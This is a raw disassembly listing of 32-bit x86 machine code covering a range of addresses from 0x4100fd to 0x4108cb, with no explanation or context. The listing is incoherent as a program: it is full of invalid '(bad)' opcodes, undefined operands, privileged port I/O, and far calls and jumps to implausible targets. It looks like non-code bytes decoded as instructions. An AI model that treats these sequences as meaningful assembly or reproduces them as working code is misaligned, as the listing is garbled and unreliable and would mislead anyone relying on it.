  4100fd:	in     al,dx
  4100fe:	push   0x415f3ba5
  410103:	or     eax,0xdb2903b2
  410108:	push   esi
  410109:	and    DWORD PTR [eax+0x5c],ebx
  41010c:	pop    ebp
  41010d:	xchg   ebx,eax
  41010e:	out    dx,eax
  41010f:	jl     0x410117
  410111:	mov    esi,DWORD PTR [esi+0x6354863]
  410117:	nop
  410118:	mov    edx,0x5e5bdd2a
  41011d:	or     al,0x8c
  41011f:	test   al,0x4c
  410121:	mov    ds:0x3a853455,al
  410126:	mov    ds:0xdc6fb7a8,al
  41012b:	out    dx,eax
  41012c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41012d:	jne    0x410177
  41012f:	mov    edi,0xd73dc4e1
  410134:	pop    esp
  410135:	cmp    al,0x9b
  410137:	gs push es
  410139:	mov    dh,0x81
  41013b:	and    edi,esi
  41013d:	pop    ss
  41013e:	sar    bl,cl
  410140:	int3   
  410141:	add    eax,0x69c67941
  410146:	sbb    BYTE PTR [ebp+0x13],0x17
  41014a:	sbb    eax,0xaa10f6fa
  41014f:	inc    esi
  410150:	mov    ds:0x48d61808,al
  410155:	rol    DWORD PTR [edx],1
  410157:	scas   eax,DWORD PTR es:[edi]
  410158:	sbb    edi,ebp
  41015a:	dec    esi
  41015b:	xchg   edx,eax
  41015c:	xor    BYTE PTR [esi-0x14],al
  41015f:	ret    0xcb20
  410162:	bts    DWORD PTR ds:0x9871c6c,ebp
  410169:	rcr    esp,1
  41016b:	xor    BYTE PTR [esi],ch
  41016d:	rol    dl,1
  41016f:	shr    BYTE PTR [ebp-0x33],1
  410172:	push   edi
  410173:	push   ss
  410174:	retf   0xb2a2
  410177:	out    0xdc,al
  410179:	gs retf 
  41017b:	adc    bh,BYTE PTR [edx]
  41017d:	clc    
  41017e:	les    edx,FWORD PTR [ebp+0x39]
  410181:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410182:	push   eax
  410183:	or     dh,BYTE PTR [edx-0x1c]
  410186:	das    
  410187:	ficom  DWORD PTR [edi+0x29]
  41018a:	(bad)  
  41018b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41018c:	test   al,0xc1
  41018e:	bound  esp,QWORD PTR [edx+0x5fc0f76f]
  410194:	daa    
  410195:	sub    DWORD PTR [esi],ebp
  410197:	call   0x26f9:0x1867c258
  41019e:	sub    dl,BYTE PTR [edx+esi*8-0x5d043d96]
  4101a5:	outs   dx,DWORD PTR ds:[esi]
  4101a6:	sub    eax,0x7c4840fe
  4101ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4101ac:	imul   ebp,DWORD PTR [ebx],0x7679188a
  4101b2:	or     DWORD PTR [eax],ebp
  4101b4:	push   ss
  4101b5:	outs   dx,BYTE PTR ds:[esi]
  4101b6:	div    BYTE PTR [ebx-0x60]
  4101b9:	imul   esp,ecx,0xffffffdc
  4101bc:	jmp    0x410159
  4101be:	mov    al,0x58
  4101c0:	jb     0x4101fb
  4101c2:	pop    ecx
  4101c3:	jmp    0x2867d14e
  4101c8:	ins    BYTE PTR es:[edi],dx
  4101c9:	aas    
  4101ca:	jnp    0x4101a2
  4101cc:	fwait
  4101cd:	inc    ecx
  4101ce:	sbb    edi,DWORD PTR [eax-0x49a8ae77]
  4101d4:	mov    al,ds:0x611549ee
  4101d9:	lahf   
  4101da:	adc    eax,0x78066ee
  4101df:	jo     0x410166
  4101e1:	call   0x844d121
  4101e6:	outs   dx,DWORD PTR ds:[esi]
  4101e7:	ja     0x4101e9
  4101e9:	in     eax,dx
  4101ea:	adc    BYTE PTR [ebx+ebx*8+0x6e],bl
  4101ee:	nop
  4101ef:	retf   0x5fcb
  4101f2:	add    BYTE PTR [esi],dl
  4101f4:	sbb    BYTE PTR [eax+esi*1],dl
  4101f7:	push   edi
  4101f8:	cmp    al,BYTE PTR [eax]
  4101fa:	loope  0x410275
  4101fc:	jmp    0x41024d
  4101fe:	jo     0x41018b
  410200:	ret    0x241f
  410203:	jbe    0x4101a7
  410205:	push   0xf588c6ae
  41020a:	sbb    dl,al
  41020c:	and    al,0x5
  41020e:	mov    ah,0x9b
  410210:	rol    bh,1
  410212:	mov    bl,0x15
  410214:	cmp    al,0x62
  410216:	pop    edx
  410217:	clc    
  410218:	stc    
  410219:	inc    ecx
  41021a:	(bad)  
  41021b:	mov    ebx,0x5884749d
  410220:	loopne 0x410250
  410222:	pop    es
  410223:	in     eax,dx
  410224:	cmp    eax,0xc98841ed
  410229:	sbb    ch,BYTE PTR [ecx]
  41022b:	dec    ecx
  41022c:	out    0x29,al
  41022e:	mov    bp,0x5c63
  410232:	cmp    eax,0x33450783
  410237:	sbb    bh,BYTE PTR [ebp+0x229216fd]
  41023d:	xchg   BYTE PTR [ebx+0x46f386f6],dl
  410243:	xchg   ebx,eax
  410244:	pop    eax
  410245:	jne    0x41026a
  410247:	mov    edi,0xa04e91f7
  41024c:	adc    BYTE PTR [ecx],cl
  41024e:	aaa    
  41024f:	dec    edi
  410250:	imul   esp,DWORD PTR [ebx-0x7b],0x63
  410254:	adc    eax,0x723f287a
  410259:	jl     0x4101e9
  41025b:	or     al,0x4b
  41025d:	jge    0x410255
  41025f:	shl    BYTE PTR [edx],1
  410261:	cdq    
  410262:	mov    eax,0xda6457e0
  410267:	sub    DWORD PTR [eax+eax*2+0x7720ae51],0x7a2adabf
  410272:	pop    ecx
  410273:	into   
  410274:	cdq    
  410275:	fwait
  410276:	sbb    bh,dh
  410278:	push   ss
  410279:	fisubr DWORD PTR [edx-0x3bc499a3]
  41027f:	dec    esp
  410280:	sub    eax,0x2d345b27
  410285:	xchg   ebx,eax
  410286:	cmp    cl,BYTE PTR [esi+edi*1-0x6]
  41028a:	pop    eax
  41028b:	(bad)  
  41028c:	mov    ch,0x2
  41028e:	rcl    BYTE PTR [eax],cl
  410290:	xor    al,0x3f
  410292:	cmp    ch,BYTE PTR [eax+0x6c]
  410295:	loope  0x410265
  410297:	rol    ah,1
  410299:	pop    edi
  41029a:	mov    eax,0x59791e27
  41029f:	fisttp DWORD PTR [eax]
  4102a1:	popa   
  4102a2:	ins    DWORD PTR es:[edi],dx
  4102a3:	(bad)  
  4102a4:	shr    bl,1
  4102a6:	mov    bl,0xb4
  4102a8:	dec    esi
  4102a9:	nop
  4102aa:	jmp    0x60976e6d
  4102af:	fwait
  4102b0:	adc    DWORD PTR [eax+0x12],eax
  4102b3:	inc    ecx
  4102b4:	out    dx,al
  4102b5:	jecxz  0x410269
  4102b7:	stc    
  4102b8:	inc    edi
  4102b9:	arpl   WORD PTR [ebx],cx
  4102bb:	mov    esi,0xdd9f66ad
  4102c0:	enter  0x3488,0x7b
  4102c4:	add    dl,0x5c
  4102c7:	mov    edx,0x32d2a3ab
  4102cc:	adc    al,0x36
  4102ce:	retf   0x312d
  4102d1:	add    eax,0xfb262a2
  4102d6:	clc    
  4102d7:	cmp    DWORD PTR [eax+0x6],edi
  4102da:	push   edi
  4102db:	sbb    ah,0x4b
  4102de:	lods   al,BYTE PTR ds:[esi]
  4102df:	sub    DWORD PTR [ebx+0x465e531],ebp
  4102e5:	inc    ecx
  4102e6:	pop    edx
  4102e7:	fmul   st(3),st
  4102e9:	out    0x43,al
  4102eb:	xlat   BYTE PTR ds:[ebx]
  4102ec:	out    dx,eax
  4102ed:	out    dx,al
  4102ee:	and    eax,0xc6daedac
  4102f3:	jae    0x41029c
  4102f5:	jl     0x410323
  4102f7:	shl    bh,cl
  4102f9:	jg     0x4102a3
  4102fb:	hlt    
  4102fc:	mov    al,ds:0x6e73f32a
  410301:	loop   0x4102b3
  410303:	in     al,0x8d
  410305:	inc    ebx
  410306:	and    cl,dl
  410308:	sub    ecx,DWORD PTR [ebp-0x2a46c542]
  41030e:	jne    0x4102e5
  410310:	div    ebp
  410312:	dec    ecx
  410313:	xchg   dl,bh
  410315:	int3   
  410316:	scas   al,BYTE PTR es:[edi]
  410317:	adc    al,0x2
  410319:	int    0x12
  41031b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41031c:	sbb    DWORD PTR [edi],eax
  41031e:	fcmovbe st,st(0)
  410320:	mov    esp,0xa9f8dc89
  410325:	and    DWORD PTR ds:0xc68926d4,esi
  41032b:	cli    
  41032c:	mov    eax,ds:0x5d21f900
  410331:	push   ss
  410332:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410333:	fcmovb st,st(6)
  410335:	xchg   ebp,edx
  410337:	cmp    al,0x2
  410339:	in     al,0x48
  41033b:	add    dl,BYTE PTR [edi+0x63]
  41033e:	scas   eax,DWORD PTR es:[edi]
  41033f:	call   0xfd28d9f1
  410344:	xchg   dl,ch
  410346:	sahf   
  410347:	fld    TBYTE PTR [esi+0x4d]
  41034a:	or     cl,BYTE PTR [esi]
  41034c:	dec    ecx
  41034d:	jb     0x41037c
  41034f:	test   al,0x10
  410351:	xchg   ebx,eax
  410352:	inc    esp
  410353:	push   ebx
  410354:	fadd   st(5),st
  410356:	jo     0x410349
  410358:	dec    esp
  410359:	loop   0x410352
  41035b:	int    0x3e
  41035d:	fdivr  QWORD PTR [edx]
  41035f:	cmp    eax,ebx
  410361:	inc    ebx
  410362:	push   ds
  410363:	nop
  410364:	xchg   esi,eax
  410365:	int    0x8a
  410367:	icebp  
  410368:	sbb    eax,0x3b1cdb2
  41036d:	mov    eax,0xaa314a14
  410372:	std    
  410373:	lahf   
  410374:	nop
  410375:	repz in al,0xb5
  410378:	call   0xb404deb1
  41037d:	ins    BYTE PTR es:[edi],dx
  41037e:	repnz dec ebp
  410380:	jp     0x410338
  410382:	jne    0x410305
  410384:	loope  0x41033a
  410386:	add    bx,bp
  410389:	xchg   esp,eax
  41038a:	cmp    al,0xe3
  41038c:	dec    ebx
  41038d:	in     al,dx
  41038e:	sbb    dh,BYTE PTR ss:[edx]
  410391:	add    eax,0xd78574fd
  410396:	and    edx,DWORD PTR [ebp+0x69]
  410399:	(bad)  
  41039a:	fisttp DWORD PTR [esi]
  41039c:	ret    
  41039d:	add    al,0x86
  41039f:	std    
  4103a0:	aaa    
  4103a1:	or     ah,dl
  4103a3:	mov    al,0x93
  4103a5:	dec    esp
  4103a6:	adc    al,BYTE PTR [edx-0x5]
  4103a9:	stc    
  4103aa:	mov    al,ds:0x9f764888
  4103af:	popa   
  4103b0:	call   0xaacc6463
  4103b5:	lea    edx,[ebx]
  4103b7:	mov    esp,0x11c0e7dc
  4103bc:	aas    
  4103bd:	(bad)  
  4103bf:	jo     0x410438
  4103c1:	icebp  
  4103c2:	repz leave 
  4103c4:	xchg   BYTE PTR [eax+ebx*2+0x3c],cl
  4103c8:	xor    BYTE PTR [edx],0x1a
  4103cb:	ret    
  4103cc:	sub    cl,BYTE PTR [edi-0x6f1a45b9]
  4103d2:	xor    al,0x52
  4103d4:	pop    edx
  4103d5:	ss mov bh,0x2b
  4103d8:	or     eax,0xfea6d86c
  4103dd:	(bad)  
  4103de:	cmp    ebx,DWORD PTR [ecx+esi*4]
  4103e1:	push   ebp
  4103e2:	jb     0x4103cd
  4103e4:	xchg   esi,eax
  4103e5:	imul   esi,DWORD PTR [ebp+0x7b],0xef3ed106
  4103ec:	loopne 0x410403
  4103ee:	sbb    cl,0x5d
  4103f1:	lods   al,BYTE PTR ds:[esi]
  4103f2:	adc    al,0xcd
  4103f4:	dec    ebx
  4103f5:	int3   
  4103f6:	loop   0x410435
  4103f8:	xchg   edi,eax
  4103f9:	pusha  
  4103fa:	mov    BYTE PTR [edx+0x4],ch
  4103fd:	mov    DWORD PTR [ecx],eax
  4103ff:	in     al,dx
  410400:	test   DWORD PTR [edi-0x29e2cdfb],esi
  410406:	test   BYTE PTR [ebx-0xe],bh
  410409:	(bad)  
  41040a:	js     0x4103c5
  41040c:	mov    al,ds:0x7835fdce
  410411:	dec    ebp
  410412:	sbb    DWORD PTR [eax-0x2ac98fb7],edx
  410418:	xchg   edi,esi
  41041a:	sbb    BYTE PTR [eax],cl
  41041c:	mov    BYTE PTR [ebp+0x27],bh
  41041f:	adc    ebp,DWORD PTR [eax+0x15]
  410422:	pop    eax
  410423:	(bad)  
  410424:	ja     0x4103c3
  410426:	or     DWORD PTR [edx+ebp*2],eax
  410429:	inc    esp
  41042a:	push   edx
  41042b:	ret    
  41042c:	push   ebp
  41042d:	loop   0x41046c
  41042f:	fnstenv [ebp+0x4e01fa7c]
  410435:	aam    0xd8
  410437:	aaa    
  410438:	mov    ?,WORD PTR [eax-0x4c5cbd4b]
  41043e:	retf   0x8e27
  410441:	in     al,dx
  410442:	imul   eax,DWORD PTR [ebp+0x53],0x48282fe9
  410449:	call   0xb090:0xaf71d53c
  410450:	daa    
  410451:	sub    al,0x53
  410453:	test   al,0xf
  410455:	sti    
  410456:	push   ss
  410457:	iret   
  410458:	jnp    0x410436
  41045a:	cli    
  41045b:	(bad)  
  41045c:	jp     0x41042a
  41045e:	push   eax
  41045f:	cmp    ebp,ecx
  410461:	int3   
  410462:	pop    eax
  410463:	cmp    al,0x7a
  410465:	cld    
  410466:	adc    cl,BYTE PTR gs:[ecx]
  410469:	ficom  DWORD PTR [ecx-0x68]
  41046c:	add    al,0x9a
  41046e:	cld    
  41046f:	mov    esp,0x849554f8
  410474:	nop
  410475:	call   0x203b:0x3bb18b25
  41047c:	jge    0x4104ae
  41047e:	mov    edx,0xf0353982
  410483:	out    0x57,al
  410485:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410486:	(bad)  
  410487:	(bad)  
  410488:	mov    ds,WORD PTR [edx+0x6679be8c]
  41048e:	div    DWORD PTR [esi]
  410490:	js     0x4104dc
  410492:	stos   DWORD PTR es:[edi],eax
  410493:	pop    ebp
  410494:	mov    ah,0xd5
  410496:	dec    esp
  410497:	stos   BYTE PTR es:[edi],al
  410498:	and    al,0x86
  41049a:	js     0x4104be
  41049c:	or     al,0xb8
  41049e:	add    dl,cl
  4104a0:	scas   eax,DWORD PTR es:[edi]
  4104a1:	repz js 0x41047f
  4104a4:	and    ebp,DWORD PTR [eax-0x1cf0f9bd]
  4104aa:	arpl   WORD PTR [edx+0x61e79adf],si
  4104b0:	adc    DWORD PTR [esi+0x6d99ce1b],0xffffffb0
  4104b7:	aad    0xc1
  4104b9:	fsub   st,st(6)
  4104bb:	iret   
  4104bc:	loopne 0x410522
  4104be:	or     eax,0x8f854869
  4104c3:	jo     0x410451
  4104c5:	inc    esp
  4104c6:	xchg   BYTE PTR ds:0x8599b8e4,dh
  4104cc:	cmp    eax,0xfe534b3
  4104d1:	(bad)
  4104d6:	mov    fs,esp
  4104d8:	sti    
  4104d9:	sbb    al,0xb9
  4104db:	mov    eax,ds:0x974d57a6
  4104e0:	retf   
  4104e1:	add    ch,BYTE PTR [edi+0x1591ddfc]
  4104e7:	gs stc 
  4104e9:	inc    ecx
  4104ea:	dec    edx
  4104eb:	inc    edx
  4104ec:	cli    
  4104ed:	mov    ebp,0xe0997e68
  4104f2:	outs   dx,BYTE PTR ds:[esi]
  4104f4:	jg     0x4104f5
  4104f6:	jno    0x410566
  4104f8:	xchg   ecx,eax
  4104f9:	shr    DWORD PTR [esi+0x55009935],1
  4104ff:	enter  0xd2f5,0xf4
  410503:	mov    ebx,0x9dc5f6d5
  410508:	test   eax,0xcc0efcc6
  41050d:	xor    edi,ebx
  41050f:	push   esp
  410510:	mov    eax,ebx
  410512:	loopne 0x41058b
  410514:	jmp    0x3d3340c9
  410519:	xchg   ch,bl
  41051b:	ret    0xecd8
  41051e:	cld    
  41051f:	test   al,0x5c
  410521:	dec    ebx
  410522:	(bad)  
  410523:	jle    0x410546
  410525:	idiv   BYTE PTR [ecx-0x7]
  410528:	dec    eax
  410529:	arpl   bx,di
  41052b:	sub    edi,DWORD PTR [esi-0x35]
  41052e:	mov    ?,WORD PTR [esi]
  410530:	les    ecx,FWORD PTR [ebp+0x644c68]
  410536:	inc    edx
  410537:	mov    al,0x51
  410539:	repz push edx
  41053b:	inc    DWORD PTR [edx+0x0]
  41053e:	and    esi,esi
  410540:	(bad)  
  410541:	mov    al,0x98
  410543:	aas    
  410544:	xchg   esp,eax
  410545:	mov    dh,dl
  410547:	aas    
  410548:	mov    eax,edi
  41054a:	repnz stos BYTE PTR es:[edi],al
  41054c:	xchg   BYTE PTR ds:0xa7bf4519,cl
  410552:	sbb    eax,eax
  410554:	push   0xffffffe9
  410556:	jmp    DWORD PTR [edx+0x4b]
  410559:	mov    BYTE PTR [esi-0x3123381],dl
  41055f:	and    al,0x3e
  410561:	or     DWORD PTR [ebx+0x36],edx
  410564:	std    
  410565:	xor    DWORD PTR [esp+edi*2],esp
  410568:	fs xchg ebx,eax
  41056a:	(bad)  
  41056b:	sub    esp,DWORD PTR [eax]
  41056d:	mov    eax,ds:0x88ae92ed
  410572:	pop    eax
  410573:	push   edx
  410574:	fwait
  410575:	pusha  
  410576:	dec    edi
  410578:	xchg   ebx,eax
  410579:	adc    DWORD PTR [edi-0x70cb7ef6],ebx
  41057f:	adc    DWORD PTR [edi+0x14f2a6f7],0xffffff96
  410586:	mov    DWORD PTR [edi+eiz*1],0xe1d3fdc1
  41058d:	inc    esp
  41058e:	mov    ebx,0xe2e2a311
  410593:	mov    ds:0x4ca578ac,eax
  410598:	sbb    ch,dh
  41059a:	jnp    0x410610
  41059c:	adc    edx,DWORD PTR [edi+0x142ad954]
  4105a2:	loop   0x4105d1
  4105a4:	test   BYTE PTR [edx],ch
  4105a6:	push   ecx
  4105a7:	sbb    ecx,DWORD PTR [edx-0x435684ec]
  4105ad:	add    DWORD PTR ds:0x386a79c6,edi
  4105b3:	fs (bad) 
  4105b5:	jl     0x410577
  4105b7:	dec    edi
  4105b8:	js     0x4105cd
  4105ba:	cmp    eax,0x2000f8ed
  4105bf:	ins    BYTE PTR es:[edi],dx
  4105c0:	push   ecx
  4105c1:	inc    eax
  4105c3:	jge    0x410644
  4105c5:	mov    ds:0x2a577637,al
  4105cb:	iret   
  4105cc:	sbb    al,0x7c
  4105ce:	repnz scas al,BYTE PTR es:[edi]
  4105d0:	data16 (bad) 
  4105d2:	std    
  4105d3:	sub    eax,0xdf474f92
  4105d8:	dec    esi
  4105d9:	stos   DWORD PTR es:[edi],eax
  4105da:	mov    esp,0x60ba0d2a
  4105df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4105e0:	add    al,0xca
  4105e2:	test   al,0xdd
  4105e4:	ret    
  4105e5:	rol    BYTE PTR [edx],1
  4105e7:	aam    0xd6
  4105e9:	enter  0xb20a,0x11
  4105ed:	inc    esp
  4105ee:	sbb    cl,dl
  4105f0:	fnstcw WORD PTR [ebp+esi*2+0x60c16402]
  4105f7:	(bad)  
  4105f8:	fadd   DWORD PTR [eax+0x6e]
  4105fb:	cmp    BYTE PTR [edi+esi*4],0xe1
  4105ff:	xchg   ecx,eax
  410600:	xchg   edx,eax
  410601:	pop    DWORD PTR [ebp+ecx*2+0x5d]
  410605:	or     BYTE PTR [esp+ebx*2],al
  410608:	or     edx,DWORD PTR [eax+0x48349722]
  41060e:	adc    al,0x97
  410610:	dec    edx
  410611:	fwait
  410612:	scas   al,BYTE PTR es:[edi]
  410613:	iret   
  410614:	mul    BYTE PTR [eax+edi*1+0xc57b106]
  41061b:	mov    ecx,0x615561ae
  410620:	arpl   WORD PTR [eax+0x53f1758f],bp
  410626:	ret    
  410627:	outs   dx,BYTE PTR ds:[esi]
  410628:	loope  0x41068e
  41062a:	repnz dec ebp
  41062c:	arpl   WORD PTR [edi-0x41],bp
  41062f:	xchg   edx,eax
  410630:	daa    
  410631:	mov    esp,DWORD PTR [esi]
  410633:	dec    edi
  410634:	sub    edx,DWORD PTR [esi-0xc]
  410637:	dec    ebx
  410638:	sbb    DWORD PTR [ecx],ecx
  41063a:	mov    edi,0x6964912
  41063f:	ret    0xa5a6
  410642:	cmp    BYTE PTR [ecx-0x40],al
  410645:	in     eax,dx
  410646:	call   DWORD PTR [esi-0x2881c83f]
  41064c:	addr16 pop esi
  41064e:	xor    ebx,esi
  410650:	clc    
  410651:	adc    al,0xec
  410653:	xor    eax,DWORD PTR [esp+ebp*4-0x2979ff6d]
  41065a:	shl    ebp,0x64
  41065d:	sbb    eax,0xffffff99
  410660:	push   ebx
  410661:	mov    dl,0xa1
  410663:	lock retf 
  410665:	out    dx,al
  410666:	push   ecx
  410667:	mov    BYTE PTR [eax-0x39],cl
  41066a:	loopne 0x410643
  41066c:	mov    ah,0x88
  41066e:	adc    al,0x6c
  410670:	retf   0xb206
  410673:	mov    dl,0xa5
  410675:	in     al,0xbe
  410677:	xlat   BYTE PTR ds:[ebx]
  410678:	pop    eax
  410679:	sahf   
  41067a:	ins    BYTE PTR es:[edi],dx
  41067b:	adc    DWORD PTR [eax],0xffffffc0
  41067e:	aam    0xec
  410680:	push   ds
  410681:	loope  0x4106cd
  410683:	popf   
  410684:	fdivr  DWORD PTR [ebx*2+0x3bef45e]
  41068b:	test   eax,0xef42108e
  410690:	sbb    DWORD PTR [ebx-0x59db4de0],0xfffffffb
  410697:	retf   
  410698:	dec    edi
  410699:	add    al,0x2c
  41069b:	ins    BYTE PTR es:[edi],dx
  41069c:	(bad)  
  41069d:	mov    eax,0x121b12c8
  4106a2:	pop    edi
  4106a3:	xor    esi,ebp
  4106a5:	dec    eax
  4106a6:	push   0xffffffd8
  4106a8:	ret    
  4106a9:	push   ebx
  4106aa:	jo     0x4106c4
  4106ac:	and    al,0x93
  4106ae:	cmp    al,0x91
  4106b0:	out    0xea,al
  4106b2:	ss scas eax,DWORD PTR es:[edi]
  4106b4:	iret   
  4106b5:	icebp  
  4106b6:	sub    ch,dh
  4106b8:	mov    ecx,0xe0c2fb08
  4106bd:	aad    0xf3
  4106bf:	jb     0x410662
  4106c1:	cli    
  4106c2:	xor    edx,ecx
  4106c4:	cmp    BYTE PTR [ebp-0x2a],bl
  4106c7:	cwde   
  4106c8:	icebp  
  4106c9:	fistp  QWORD PTR [edi]
  4106cb:	add    ebp,DWORD PTR [eax]
  4106cd:	sbb    ebx,DWORD PTR [edx-0x18]
  4106d0:	lea    ebx,[esi]
  4106d2:	mov    esi,0xa5836a51
  4106d7:	push   cs
  4106d8:	xor    BYTE PTR [esi+0x0],dh
  4106db:	sbb    edx,DWORD PTR [esp+esi*4+0x3]
  4106df:	ror    BYTE PTR [edx+0x1c5c7f83],cl
  4106e5:	xchg   edx,eax
  4106e6:	mov    ebp,0xb13cc183
  4106eb:	sub    ecx,ebp
  4106ed:	xor    eax,0xa3ea50cf
  4106f2:	shl    BYTE PTR [ebx+0x68],1
  4106f5:	add    ebp,DWORD PTR [edx+0x3f]
  4106f8:	mov    eax,ds:0xc9a0b05f
  4106fd:	fcmovbe st,st(2)
  4106ff:	mov    ch,0x4
  410701:	inc    edx
  410702:	imul   ecx,DWORD PTR [ecx+0x2b],0xffffff8b
  410706:	pop    es
  410707:	fs and esi,0xab0ccf53
  41070e:	ja     0x410707
  410710:	cmp    al,0x22
  410712:	mov    ch,0xae
  410714:	outs   dx,DWORD PTR ds:[esi]
  410715:	ror    ch,1
  410717:	add    DWORD PTR [esi+eax*4+0x681155a8],ebx
  41071e:	(bad)  
  41071f:	push   0xffffff98
  410721:	and    eax,0x56cfc82d
  410726:	mov    ah,0x3b
  410728:	add    dh,BYTE PTR [edi-0x298809ab]
  41072e:	addps  xmm3,XMMWORD PTR [ebp-0x5e]
  410732:	fcom   DWORD PTR [esi+0x712efdfe]
  410738:	cmp    esp,DWORD PTR [edi]
  41073a:	imul   edi,DWORD PTR [edx+0x75b8fcf2],0x34
  410741:	or     al,0x36
  410743:	cmp    DWORD PTR [esi],ebx
  410745:	mov    bh,0x10
  410747:	add    DWORD PTR [edx-0x5c3a4e29],esi
  41074d:	stc    
  41074e:	mov    ebx,0xe4813eb0
  410753:	fistp  WORD PTR [edx]
  410755:	add    edi,DWORD PTR [edx+0x1177f32f]
  41075b:	int3   
  41075c:	retf   0x4a29
  41075f:	and    DWORD PTR ds:0xe6b10ce8,ebp
  410765:	aad    0xf7
  410767:	pop    ss
  410768:	adc    DWORD PTR [ebx],ebx
  41076a:	mov    WORD PTR [esi],cs
  41076c:	mov    edi,0x98e82bd7
  410771:	out    0x7c,eax
  410773:	bound  esi,QWORD PTR [ebx-0x152475a]
  410779:	and    bl,BYTE PTR ds:0x2c1c87ef
  41077f:	and    ebx,DWORD PTR [esi]
  410781:	or     BYTE PTR [ebp+0x16],bl
  410784:	shl    ebx,0xb9
  410787:	push   cs
  410788:	sar    BYTE PTR [ecx+ebx*8],cl
  41078b:	sub    BYTE PTR [edi-0x80],cl
  41078e:	(bad)  
  41078f:	mov    bh,0xc8
  410791:	data16 (bad) 
  410793:	jecxz  0x410770
  410795:	and    eax,0x82fe8198
  41079a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41079b:	rcl    DWORD PTR [edx+0x10],cl
  41079e:	arpl   WORD PTR [esp+eax*4+0x5a],dx
  4107a2:	sbb    DWORD PTR [eax-0x53],edx
  4107a5:	xor    BYTE PTR [edi+0x45],cl
  4107a8:	cmp    BYTE PTR [eax],dl
  4107aa:	push   ss
  4107ab:	inc    edi
  4107ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4107ad:	and    BYTE PTR [ebx+0x74],ah
  4107b0:	inc    BYTE PTR [eax+0x2563cc36]
  4107b6:	das    
  4107b7:	xor    DWORD PTR [ebp+0x708b23c2],ecx
  4107bd:	push   ecx
  4107be:	cs push ebx
  4107c1:	(bad)  
  4107c3:	(bad)  
  4107c4:	jmp    0x4107aa
  4107c6:	loopne 0x41081f
  4107c8:	push   0xffffffec
  4107ca:	rol    DWORD PTR [ecx],0x51
  4107cd:	repnz xchg edi,eax
  4107cf:	push   0xffffffd9
  4107d1:	push   ss
  4107d2:	aam    0x23
  4107d4:	mov    al,ds:0x9d8a4884
  4107d9:	pop    ss
  4107da:	popf   
  4107db:	retf   0x3766
  4107de:	pop    edi
  4107df:	sar    BYTE PTR [ebp+0x2766afaa],0x1d
  4107e6:	xchg   ecx,eax
  4107e7:	xor    DWORD PTR [esi],edi
  4107e9:	retf   
  4107ea:	lods   al,BYTE PTR ds:[esi]
  4107eb:	arpl   bp,cx
  4107ed:	push   esi
  4107ee:	test   al,0xab
  4107f0:	fsub   QWORD PTR [ecx+esi*8-0x35f2b7ba]
  4107f7:	fcomip st,st(5)
  4107f9:	xchg   esp,eax
  4107fa:	lahf   
  4107fb:	loop   0x4107ca
  4107fd:	clc    
  4107fe:	adc    bl,BYTE PTR [esi+0x37]
  410801:	sbb    al,BYTE PTR [eax+eiz*1]
  410804:	scas   al,BYTE PTR es:[edi]
  410805:	mov    bh,0x71
  410807:	sub    DWORD PTR ds:[edx-0x30],ebx
  41080b:	retf   
  41080c:	fcomip st,st(1)
  41080e:	dec    ecx
  41080f:	div    BYTE PTR [esi+eiz*1+0x5d6bf071]
  410816:	loop   0x410828
  410818:	dec    eax
  410819:	jno    0x41088d
  41081b:	push   es
  41081c:	inc    esi
  41081d:	cmp    edi,DWORD PTR [ebp+0x38842af8]
  410823:	scas   al,BYTE PTR es:[edi]
  410824:	mov    al,ds:0x9dc24bd1
  410829:	mov    esi,0xb6a3e4d8
  41082e:	inc    eax
  41082f:	jge    0x41088b
  410831:	xor    ecx,ebx
  410833:	jnp    0x4107d3
  410835:	cmp    esp,edx
  410837:	repnz cmp esp,DWORD PTR [edx]
  41083a:	div    ch
  41083c:	push   0x52
  41083e:	add    al,0x58
  410840:	jns    0x410896
  410842:	jae    0x4108bb
  410844:	pop    es
  410845:	icebp  
  410846:	or     BYTE PTR [esi+0x3b],ah
  410849:	pop    DWORD PTR [ebx]
  41084b:	or     eax,0x64ee100e
  410850:	sub    ch,BYTE PTR [ebp-0x41]
  410853:	add    ebx,DWORD PTR [edi+0x22470fa8]
  410859:	int3   
  41085a:	ins    BYTE PTR es:[edi],dx
  41085b:	xchg   edi,eax
  41085c:	(bad)  [eax]
  41085e:	shr    BYTE PTR [ebx],1
  410860:	stos   BYTE PTR es:[edi],al
  410861:	int3   
  410862:	dec    edi
  410863:	or     al,0xf4
  410865:	fcomp  QWORD PTR [ebx]
  410867:	lods   al,BYTE PTR ds:[esi]
  410868:	mov    ecx,0xe56be03c
  41086d:	mov    dl,0x2f
  41086f:	add    al,0x76
  410871:	mov    ds,WORD PTR [edx+0x6e]
  410874:	in     eax,dx
  410875:	sbb    DWORD PTR [ebx-0x5a166d27],0xa2d8504c
  41087f:	inc    edx
  410880:	cld    
  410881:	and    BYTE PTR [edi],bl
  410883:	repz scas al,BYTE PTR es:[edi]
  410885:	sbb    ebp,DWORD PTR [edx-0x5f]
  410888:	xor    al,0x82
  41088a:	adc    eax,0x962a450b
  41088f:	push   eax
  410890:	daa    
  410891:	addr16 lahf 
  410893:	repnz stos DWORD PTR es:[edi],eax
  410895:	lods   eax,DWORD PTR ds:[esi]
  410896:	in     eax,dx
  410897:	add    bh,BYTE PTR [edi+0x60]
  41089a:	mov    esi,0xd5c20837
  41089f:	xor    ah,0x73
  4108a2:	imul   esi,DWORD PTR [esi+0x38],0xffffffc9
  4108a6:	cmp    cl,ah
  4108a8:	add    eax,0xf375eabc
  4108ad:	cmp    al,0x5e
  4108af:	push   0x13
  4108b1:	pop    edx
  4108b2:	fld    QWORD PTR [ebp+ebp*1+0x6e15443e]
  4108b9:	push   0xffffff81
  4108bb:	inc    esp
  4108bc:	sbb    eax,0x1f66ea6a
  4108c1:	sar    ecx,cl
  4108c3:	fsubr  st(0),st
  4108c5:	out    dx,eax
  4108c6:	ds sbb al,0x1a
  4108c9:	inc    esp
  4108ca:	xchg   esi,eax
  4108cb:	sbb    al,0x1d
